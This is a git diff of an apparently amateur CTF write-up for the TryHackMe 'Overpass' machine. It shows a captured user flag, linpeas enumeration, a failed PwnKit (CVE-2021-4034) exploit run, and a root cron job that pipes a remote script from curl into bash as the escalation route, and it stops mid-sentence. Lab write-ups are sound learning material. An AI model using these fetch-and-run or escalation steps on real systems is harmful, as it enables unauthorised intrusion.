@@ -120,8 +120,11 @@ james@overpass-prod:~$ ls
 todo.txt  user.txt
 james@overpass-prod:~$ cat user.txt 
 thm{65c1aaf000506e56996822c6281e6bf7}
-> yey we got the first flag
+```
 
+yey we got the first flag
+
+```
 james@overpass-prod:~$ cat todo.txt 
 To Do:
 > Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
@@ -135,18 +138,14 @@ james@overpass-prod:~$ [2023-02-09T00:43:11] Synchronising notes from Evernote.
 
 ### Privileged Escalation
 
+now I dont know what to do again, I was trying to check for any other clue but I dont get it..
+so I sent linpeas to enumerate the machinen on my kali box I shared my directory
 ```
-
->- now I dont know what to do again, I was trying to check for any other clue but I dont get it..
-so I sent linpeas to enumerate the machine
->- on my kali box I shared my directory
-
 └─$ sudo cp linpeas.sh /var/www/html
 [sudo] password for aaron: 
 ┌──(aaron㉿kali)-[/opt]
-└─$ cd /var/www/html                
-                            
-                                                                              
+└─$ cd /var/www/html
+                                                                             
 ┌──(aaron㉿kali)-[/var/www/html]
 └─$ systemctl status apache2
 ○ apache2.service - The Apache HTTP Server
@@ -154,9 +153,9 @@ so I sent linpeas to enumerate the machine
      Active: inactive (dead)
 ┌──(aaron㉿kali)-[/var/www/html]
 └─$ systemctl start apache2 
-                                 
-> back to the remote machine
-
+```                                 
+back to the victime machine
+```
 james@overpass-prod:~$ cd /root
 -bash: cd: /root: Permission denied
 
@@ -181,12 +180,15 @@ drwxrwxrwt  2 root  root      60 Feb  9 05:47 .
 drwxr-xr-x 18 root  root    3760 Feb  9 04:00 ..
 -rwxrwxr-x  1 james james 828087 Feb  9 05:46 linpeas.sh
 james@overpass-prod:/dev/shm$ ./linpeas.sh 
+```
 
-> it seems it is vulnerable to pwnkit
+it seems it is vulnerable to pwnkit
+```
 ╔══════════╣ CVEs Check
-Vulnerable to CVE-2021-4034   
-> back to my kali I downloaded the exploit
-
+Vulnerable to CVE-2021-4034
+```
+back to my kali I downloaded the CVE-2021-4034 exploit
+```
 james@overpass-prod:/dev/shm$ gcc hehe.c -o hoho
 james@overpass-prod:/dev/shm$ ls
 hehe.c  hoho  linpeas.sh
@@ -194,16 +196,14 @@ james@overpass-prod:/dev/shm$ ./hoho
 GLib: Cannot convert message: Could not open converter from “UTF-8” to “PWNKIT”
 Cannot run program pwnkit.so:.: No such file or directory
 james@overpass-prod:/dev/shm$ 
-
-> i cannot run the pwnkit so I decided to watch the write up of mr. john hammond
-
-> so we found this vulnerability, it runs every minute
-
+```
+i cannot run the pwnkit so I decided to watch the write up of mr. john hammond
+so we found this vulnerability, it runs every minute
+```
 * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+```
 
-> 
-
-> back to my kali machine i 
+back to my kali machine i 
 
 
 
